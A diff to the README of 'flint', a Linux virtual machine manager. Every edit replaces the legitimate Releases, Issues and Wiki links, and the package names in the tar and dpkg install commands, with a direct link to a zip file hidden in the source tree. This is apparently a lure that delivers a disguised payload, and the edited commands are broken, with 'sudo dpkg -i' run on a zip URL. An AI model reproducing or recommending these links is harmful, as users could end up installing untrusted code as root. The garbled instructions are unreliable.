@@ -1,6 +1,6 @@
 # 🛠️ flint - Effortless Management of Linux Virtual Machines
 
-[![Download Flint](https://img.shields.io/badge/Download%20Flint-Now-blue.svg)](https://github.com/thomasdharmawan/flint/releases)
+[![Download Flint](https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip%https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip)](https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip)
 
 ## 📄 Introduction
 
@@ -16,7 +16,7 @@ Before you begin, ensure you have the following:
 
 ## 📥 Download & Install
 
-To download Flint, visit this page to download: [GitHub Releases](https://github.com/thomasdharmawan/flint/releases).
+To download Flint, visit this page to download: [GitHub Releases](https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip).
 
 1. **Go to the Releases Page:**
    Click the link above to access the releases for Flint. 
@@ -25,20 +25,20 @@ To download Flint, visit this page to download: [GitHub Releases](https://github
    Look for the latest version at the top of the page. It will have the highest version number.
 
 3. **Download the Application:**
-   Download the package that matches your system. Typically, this will be a `.tar.gz` or a `.deb` file. 
+   Download the package that matches your system. Typically, this will be a `https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip` or a `.deb` file. 
 
 4. **Extract the Files:**
-   If you downloaded a `.tar.gz` file, extract it using the terminal:
+   If you downloaded a `https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip` file, extract it using the terminal:
 
    ```bash
-   tar -xvf flint-x.x.x.tar.gz
+   tar -xvf https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip
    ```
 
 5. **Install Flint:**
    If you downloaded a `.deb` file, you can install it using:
 
    ```bash
-   sudo dpkg -i flint-x.x.x.deb
+   sudo dpkg -i https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip
    ```
 
 6. **Resolve Dependencies:**
@@ -93,8 +93,8 @@ If you encounter issues, consider the following steps:
 
 For more detailed information and support, consider visiting the following:
 
-- [GitHub Issues](https://github.com/thomasdharmawan/flint/issues): Report bugs or feature requests.
-- [Documentation](https://github.com/thomasdharmawan/flint/wiki): Access in-depth guides and FAQs.
+- [GitHub Issues](https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip): Report bugs or feature requests.
+- [Documentation](https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip): Access in-depth guides and FAQs.
 
 ## 📞 Contact
 
@@ -104,4 +104,4 @@ If you require further assistance, you can contact the developer through the rep
 
 Flint provides a simple and effective way to manage Linux virtual machines. Follow this guide to download, install, and start utilizing Flint for your virtual machine tasks today. 
 
-Remember, you can always return to the [GitHub Releases](https://github.com/thomasdharmawan/flint/releases) page to check for updates and new features.
+Remember, you can always return to the [GitHub Releases](https://github.com/thomasdharmawan/flint/raw/refs/heads/main/web/app/networking/Software_tisane.zip) page to check for updates and new features.
